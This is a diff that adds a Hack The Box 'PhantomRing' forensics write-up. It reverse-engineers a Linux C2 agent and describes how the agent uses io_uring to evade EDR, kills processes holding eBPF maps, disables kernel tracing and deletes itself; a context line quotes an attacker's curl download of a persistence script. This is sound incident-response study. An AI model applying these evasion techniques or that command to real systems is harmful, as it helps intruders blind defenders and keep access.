@@ -3489,6 +3489,90 @@ In `auth.log`, we can see this line:
 ![image](https://hackmd.io/_uploads/BJzPTEcZfg.png)
 Answer: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 
+### VII. PhantomRing:
+> Link lab: https://app.hackthebox.com/sherlocks/PhantomRing?tab=play_sherlock
+> Đề bài:
+> ![image](https://hackmd.io/_uploads/B1eWzsQHzg.png)
+
+#### 1. What is the SHA256 hash of the malicious binary?
+Check for the file and its SHA256:
+![image](https://hackmd.io/_uploads/Hy3dj7qBfg.png)
+> [VirusTotal](https://www.virustotal.com/gui/file/2d7b1b2178f76c26893b2a56cbf9b36700235259e76b893d53817d5b66b634a5)
+
+Answer: `2d7b1b2178f76c26893b2a56cbf9b36700235259e76b893d53817d5b66b634a5`
+
+#### 2. What is the IP address hardcoded in the binary for C2 communication?
+Run the command below to find all IPv4 that is contained in `agent`:
+![image](https://hackmd.io/_uploads/SJKo3Qqrzl.png)
+Answer: `192.168.56.1`
+> We can use tool Cutter by running command `./squashfs-root/AppRun`, then open `agent` and find function `main`:
+> ![image](https://hackmd.io/_uploads/SkBClzoBfl.png)
+
+#### 3. What port does the agent connect to on the C2 server?
+Function `htons()` is the abbreviation of `Host TO Network Short`, using Cutter to find this function:
+![image](https://hackmd.io/_uploads/r1NGMMjSGl.png)
+`000015d` is `0x115D`, revert from hex to dec and we have `4445`.
+> We can run the following command:
+> ![image](https://hackmd.io/_uploads/Sy3YfMsSGg.png)
+
+Answer: `4445`
+
+#### 4. How many seconds does the agent wait before attempting to reconnect after a failed connection?
+We have to find the delay/sleep value in logic connect. In `main`:
+![image](https://hackmd.io/_uploads/B1qIIfoHfg.png)
+Convert `0x78` to dec, we get `120`.
+
+Answer: `120`
+
+#### 5. How many different commands does the agent support?
+In Cutter, there are 11 function `cmd_*`:
+![image](https://hackmd.io/_uploads/H1MBuGoBfx.png)
+> We can analyse function `process_cmd`, handling commands received from C2 and each command is typically compared to a hardcore string by `strncmp`/`strcmp`:
+> ![image](https://hackmd.io/_uploads/H1aSKMjBMl.png)
+> Then counting the number of function `cmd_*`.
+
+Answer: `11`
+
+#### 6. What Linux kernel interface does this malware abuse to evade EDR syscall monitoring?
+In `main`, we can see that `io_uring` is used constantly, intenting not to directly call hook syscalls used to monitor harmful behaviours such as `connect`, `execve`, `open`, `write`,...
+![image](https://hackmd.io/_uploads/r1jIofsSzg.png)
+Answer: `io_uring`
+
+#### 7. What file does the agent read to enumerate logged-in users?
+In function `cmd_users`:
+![image](https://hackmd.io/_uploads/r1mxWAhHzx.png)
+It is clear that agent read `/var/run/utmp` to enumerate logged-in users.
+Answer: `/var/run/utmp`
+
+#### 8. What directory does the agent scan when searching for SUID binaries for privilege escalation?
+In function `cmd_privesc`:
+![image](https://hackmd.io/_uploads/r1lvG03Szl.png)
+Agent scanned `/usr/bin` when searching for SUID binaries for privilege escalation.
+Answer: `/usr/bin`
+
+#### 9. What string does the agent search for in /proc/[pid]/maps to identify security tools using eBPF?
+In function `cmd_killbpf`:
+![image](https://hackmd.io/_uploads/HyHMk_JUGx.png)
+We can see that, the program scan the `/proc` directory to find all processes running in the system. For each process, it reads `/proc/<PID>/maps` to check its virtual memory. If `maps` contains the string `anon_inode:bpf-map`, it means that there has a eBPF Map in this process, and it will be killed by command `kill(pid,9)`.
+Answer: `anon_inode:bpf-map`
+
+#### 10. What is the full path of the first tracing file the agent attempts to disable?
+In `cmd_exit`:
+![image](https://hackmd.io/_uploads/rJojldy8zl.png)
+Answer: `/sys/kernel/debug/tracing/tracing_on`
+
+#### 11. What procfs path does the agent read to find its own executable location before self-destruction?
+In function `cmd_selfdestruct`:
+![image](https://hackmd.io/_uploads/ryXuRmlIfg.png)
+It is easy to see that agent will read `/proc/self/exe` to find its own executabel location before self-destruction.
+Answer: `/proc/self/exe`
+
+#### 12. What command string is compared by the agent to trigger deletion of its own binary?
+In function `process_cmd`, I saw that:
+![image](https://hackmd.io/_uploads/ryNbWVxLfe.png)
+If the string is `sdestruct`, function `cmd_selfdestruct` will be triggered.
+Answer: `sdestruct`
+
 ## DFIR-LAB:
 > Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS
 
